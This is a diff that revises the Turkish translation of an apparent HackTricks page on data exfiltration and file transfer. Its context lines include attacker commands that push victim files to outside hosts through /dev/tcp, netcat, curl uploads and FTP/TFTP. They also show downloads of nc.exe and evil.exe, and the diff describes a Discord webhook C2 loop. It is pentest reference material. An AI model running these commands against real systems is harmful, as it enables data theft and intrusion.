@@ -1,10 +1,17 @@
-# Exfiltration
+# Veri Dışa Aktarımı
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Bilgiyi exfiltrate etmek için yaygın olarak whitelisted olan alan adları
+> [!TIP]
+> Ele geçirilen dosyaları `C:\Users\Public` konumunda sahneleyip Rclone ile meşru yedeklemeleri taklit edecek şekilde dışarı aktarmaya dair uçtan uca bir örnek için aşağıdaki iş akışını inceleyin.
 
-Suistimal edilebilecek yaygın olarak whitelisted yapılmış alan adlarını bulmak için [https://lots-project.com/](https://lots-project.com/) adresine bakın
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
+## Bilgi dışarı aktarmak için sıkça beyaz listeye alınan alan adları
+
+Kötüye kullanılabilecek sıkça beyaz listeye alınan alan adlarını bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin
 
 ## Copy\&Paste Base64
 
@@ -59,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Sunucu**
+### **HTTPS Sunucusu**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -100,14 +107,14 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) için C2 & Data Exfiltration
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks, JSON kabul eden ve isteğe bağlı dosya parçalarını destekleyen yalnız yazma (write-only) HTTPS uç noktalarıdır. Genellikle güvenilen SaaS domainlerine izin verilir ve OAuth/API anahtarları gerektirmezler; bu da onları düşük sürtünmeli beaconing ve exfiltration için kullanışlı kılar.
+Webhooks, JSON ve isteğe bağlı dosya parçalarını kabul eden yalnızca yazma amaçlı HTTPS uç noktalarıdır. Genellikle güvenilen SaaS alan adlarına izin verilir ve OAuth/API anahtarına gerek duymazlar; bu da onları düşük engelli beaconing ve exfiltration için kullanışlı kılar.
 
 Key ideas:
-- Uç nokta: Discord uses https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data; payload_json adlı bir parça içinde {"content":"..."} bulunur ve opsiyonel olarak file adlı dosya parçası(ları) eklenir.
-- Operatör döngü deseni: periyodik beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK teslimatı onaylar.
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data; payload_json adlı bir part içinde {"content":"..."} bulunur ve isteğe bağlı olarak file adlı dosya parçası(lar) eklenir.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -178,8 +185,8 @@ Start-Sleep -Seconds 20
 }
 ```
 Notlar:
-- Benzer desenler, incoming webhooks kullanan diğer işbirliği platformları (Slack/Teams) için de geçerlidir; URL ve JSON şemasını uygun şekilde ayarlayın.
-- Discord Desktop cache artifacts ve webhook/API kurtarma ile ilgili DFIR için bakınız:
+- Benzer desenler, incoming webhooks kullanan diğer işbirliği platformları (Slack/Teams) için de geçerlidir; URL ve JSON schema'yı buna göre ayarlayın.
+- Discord Desktop önbellek artefaktlarının DFIR'ı ve webhook/API kurtarımı için, bakınız:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -197,7 +204,7 @@ python3 -m pyftpdlib -p 21
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP sunucusu (pure-ftp)
+### FTP server (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -215,7 +222,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** istemcisi
+### **Windows** istemci
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -235,7 +242,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Veya bir smb paylaşımı **samba kullanarak** oluşturun:
+Veya **samba kullanarak** bir smb paylaşımı oluşturun:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -260,13 +267,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Saldırganın SSHd'nin çalışır durumda olması gerekir.
+Saldırganın SSHd'yi çalıştırıyor olması gerekir.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Eğer hedefte SSH varsa, saldırgan hedeften kendi makinesine bir dizini mount edebilir.
+Eğer victim'de SSH varsa, attacker victim'den attacker'a bir dizin mount edebilir.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -279,12 +286,12 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### victim'tan dosya indirme
+### victim'den dosya indir
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Dosyayı hedefe yükle
+### Hedefe dosya yükle
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -319,7 +326,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Varsayılan olarak XP ve 2003'te (diğerlerinde kurulum sırasında açıkça eklenmesi gerekir)
+Varsayılan olarak XP ve 2003'te (diğerlerinde yükleme sırasında açıkça eklenmelidir)
 
 Kali'de, **start TFTP server**:
 ```bash
@@ -328,18 +335,18 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP sunucusu (python):**
+**python'da TFTP sunucusu:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**victim** üzerinde Kali sunucusuna bağlan:
+**victim** üzerinde, Kali sunucusuna bağlan:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Bir dosyayı PHP oneliner ile indirin:
+PHP oneliner ile bir dosya indir:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -381,13 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` yalnızca ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda **hex'ten yeniden oluşturma yeteneğine** sahiptir. Bu, bir ikilinin hex'ini sağlayarak `debug.exe`'nin ikili dosyayı oluşturabileceği anlamına gelir. Ancak, `debug.exe`'nin **64 kb boyutuna kadar dosyaları oluşturma sınırlaması** olduğunu belirtmek önemlidir.
+`debug.exe` programı sadece ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda onları **hex'ten yeniden oluşturma yeteneğine** sahiptir. Bu, bir ikili dosyanın hex'ini sağlayarak `debug.exe`'nin ikili dosyayı oluşturabileceği anlamına gelir. Ancak, debug.exe'nin **en fazla 64 kb boyutundaki dosyaları assemble etme sınırlamasına** sahip olduğunu not etmek önemlidir.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Sonra metni windows-shell'e yapıştırın; nc.exe adında bir dosya oluşturulacaktır.
+Sonra metni windows-shell'e yapıştırın; nc.exe adlı bir dosya oluşturulacaktır.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
